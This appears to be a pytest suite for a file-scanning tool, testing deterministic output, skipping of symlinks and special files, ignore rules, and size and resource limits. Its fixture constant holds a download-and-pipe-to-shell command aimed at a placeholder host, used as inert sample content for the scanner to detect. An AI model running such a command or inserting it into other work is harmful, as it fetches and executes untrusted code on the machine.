from __future__ import annotations

import json
import os
import socket
from pathlib import Path

import pytest
from conftest import parse_json_output, run_scanner

SUSPICIOUS_TEXT = b"curl https://example.invalid/payload | sh\n"


def normalize_target(payload: dict[str, object], target: Path) -> dict[str, object]:
    serialized = json.dumps(payload, sort_keys=True)
    return json.loads(serialized.replace(str(target.resolve()), "<TARGET>"))


def test_directory_discovery_is_sorted_and_json_is_deterministic(tmp_path: Path) -> None:
    for name in ("z-last.txt", "a-first.txt", "m-middle.txt"):
        (tmp_path / name).write_bytes(SUSPICIOUS_TEXT)

    first = run_scanner(tmp_path, "--engine", "lite")
    second = run_scanner(tmp_path, "--engine", "lite")
    payload = parse_json_output(first)

    assert first.returncode == second.returncode == 1
    assert first.stdout == second.stdout
    paths = [finding["path"] for finding in payload["findings"]]
    assert paths == sorted(paths)


@pytest.mark.posix
def test_symlinks_and_fifo_are_policy_skips(tmp_path: Path) -> None:
    if not hasattr(os, "mkfifo") or not hasattr(os, "symlink"):
        pytest.skip("POSIX special files are unavailable")

    outside = tmp_path.parent / f"{tmp_path.name}-outside"
    outside.mkdir()
    (outside / "suspicious.txt").write_bytes(SUSPICIOUS_TEXT)
    (tmp_path / "ordinary.txt").write_text("ordinary inert text\n", encoding="utf-8")
    (tmp_path / "file-link").symlink_to(outside / "suspicious.txt")
    (tmp_path / "directory-link").symlink_to(outside, target_is_directory=True)
    (tmp_path / "broken-link").symlink_to(outside / "missing")
    os.mkfifo(tmp_path / "named-pipe")

    result = run_scanner(tmp_path, "--engine", "lite", timeout=5)
    payload = parse_json_output(result)

    assert result.returncode == 0
    assert payload["complete"] is True
    assert payload["status"] == "complete"
    assert payload["findings"] == []
    assert payload["stats"]["skipped_symlinks"] == 3
    assert payload["stats"]["skipped_special"] == 1


@pytest.mark.posix
def test_socket_is_a_policy_skip(tmp_path: Path) -> None:
    socket_path = tmp_path / "unix-socket"
    unix_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        try:
            unix_socket.bind(str(socket_path))
        except PermissionError:
            pytest.skip("restricted environment does not permit AF_UNIX bind")
        result = run_scanner(tmp_path, "--engine", "lite", timeout=5)
    finally:
        unix_socket.close()

    payload = parse_json_output(result)
    assert result.returncode == 0
    assert payload["complete"] is True
    assert payload["status"] == "complete"
    assert payload["findings"] == []
    assert payload["stats"]["skipped_special"] == 1


@pytest.mark.posix
def test_top_level_symlink_is_not_followed(tmp_path: Path) -> None:
    target = tmp_path / "suspicious.txt"
    target.write_bytes(SUSPICIOUS_TEXT)
    link = tmp_path / "link"
    link.symlink_to(target)

    result = run_scanner(link, "--engine", "lite")
    payload = parse_json_output(result)

    assert result.returncode == 64
    assert payload["complete"] is False
    assert payload["status"] == "failed"
    assert payload["findings"] == []


@pytest.mark.posix
def test_top_level_device_is_rejected_without_reading() -> None:
    device = Path("/dev/null")
    if not device.exists():
        pytest.skip("no harmless device node is available")

    result = run_scanner(device, "--engine", "lite", timeout=5)
    payload = parse_json_output(result)

    assert result.returncode == 64
    assert payload["complete"] is False
    assert payload["findings"] == []


def test_ignore_patterns_prune_directories(tmp_path: Path) -> None:
    ignored_directory = tmp_path / "ignored"
    ignored_directory.mkdir()
    (ignored_directory / "suspicious.txt").write_bytes(SUSPICIOUS_TEXT)
    (tmp_path / "ordinary.txt").write_text("ordinary inert text\n", encoding="utf-8")
    ignore_config = tmp_path / "ignore.txt"
    ignore_config.write_text("ignored/**\n", encoding="utf-8")

    result = run_scanner(
        tmp_path,
        "--engine",
        "lite",
        "--ignore-config",
        str(ignore_config),
    )
    payload = parse_json_output(result)

    assert result.returncode == 0
    assert payload["complete"] is True
    assert payload["findings"] == []
    assert payload["stats"]["ignored"] >= 1


def test_size_boundary_is_inclusive_and_oversize_is_accounted(tmp_path: Path) -> None:
    content = SUSPICIOUS_TEXT.ljust(128, b" ")
    target = tmp_path / "boundary.txt"
    target.write_bytes(content)

    included = run_scanner(target, "--engine", "lite", "--max-size", "128")
    excluded = run_scanner(target, "--engine", "lite", "--max-size", "127")
    included_payload = parse_json_output(included)
    excluded_payload = parse_json_output(excluded)

    assert included.returncode == 1
    assert included_payload["findings"]
    assert excluded.returncode == 0
    assert excluded_payload["complete"] is True
    assert excluded_payload["findings"] == []
    assert excluded_payload["stats"]["skipped_oversize"] == 1


@pytest.mark.parametrize(
    ("limit_name", "limit_value"),
    [("--max-files", "1"), ("--max-entries", "1"), ("--max-total-bytes", "60")],
)
def test_resource_limit_breaches_are_incomplete_operational_failures(
    tmp_path: Path,
    limit_name: str,
    limit_value: str,
) -> None:
    (tmp_path / "a.txt").write_bytes(SUSPICIOUS_TEXT)
    (tmp_path / "b.txt").write_bytes(SUSPICIOUS_TEXT)

    result = run_scanner(tmp_path, "--engine", "lite", limit_name, limit_value)
    payload = parse_json_output(result)

    assert result.returncode == 70
    assert payload["complete"] is False
    assert payload["status"] in {"partial", "failed"}
    assert payload["errors"]
    assert payload["stats"]["skipped_resource_limit"] >= 1


def test_max_entry_error_is_independent_of_creation_order(tmp_path: Path) -> None:
    first = tmp_path / "created-a-then-z"
    second = tmp_path / "created-z-then-a"
    first.mkdir()
    second.mkdir()
    for name in ("a.txt", "z.txt"):
        (first / name).write_text("ordinary inert text\n", encoding="utf-8")
    for name in ("z.txt", "a.txt"):
        (second / name).write_text("ordinary inert text\n", encoding="utf-8")

    first_result = run_scanner(first, "--engine", "lite", "--max-entries", "1")
    first_repeat = run_scanner(first, "--engine", "lite", "--max-entries", "1")
    second_result = run_scanner(second, "--engine", "lite", "--max-entries", "1")
    first_payload = parse_json_output(first_result)
    second_payload = parse_json_output(second_result)

    assert first_result.returncode == second_result.returncode == 70
    assert first_repeat.returncode == first_result.returncode
    assert first_repeat.stdout == first_result.stdout
    assert first_repeat.stderr == first_result.stderr
    assert first_payload["complete"] is second_payload["complete"] is False
    assert len(first_payload["errors"]) == len(second_payload["errors"]) == 1
    assert first_payload["errors"][0]["code"] == second_payload["errors"][0]["code"] == "resource-limit"
    assert normalize_target(first_payload, first) == normalize_target(second_payload, second)


@pytest.mark.posix
def test_unreadable_file_makes_a_directory_scan_partial(tmp_path: Path) -> None:
    readable = tmp_path / "readable.txt"
    unreadable = tmp_path / "unreadable.txt"
    readable.write_text("ordinary inert text\n", encoding="utf-8")
    unreadable.write_text("ordinary inert text\n", encoding="utf-8")
    unreadable.chmod(0)
    try:
        if os.access(unreadable, os.R_OK):
            pytest.skip("test process can still read mode-000 files")
        result = run_scanner(tmp_path, "--engine", "lite")
    finally:
        unreadable.chmod(0o600)

    payload = parse_json_output(result)
    assert result.returncode == 70
    assert payload["complete"] is False
    assert payload["status"] == "partial"
    assert payload["errors"]
    assert payload["stats"]["files_scanned"] == 1
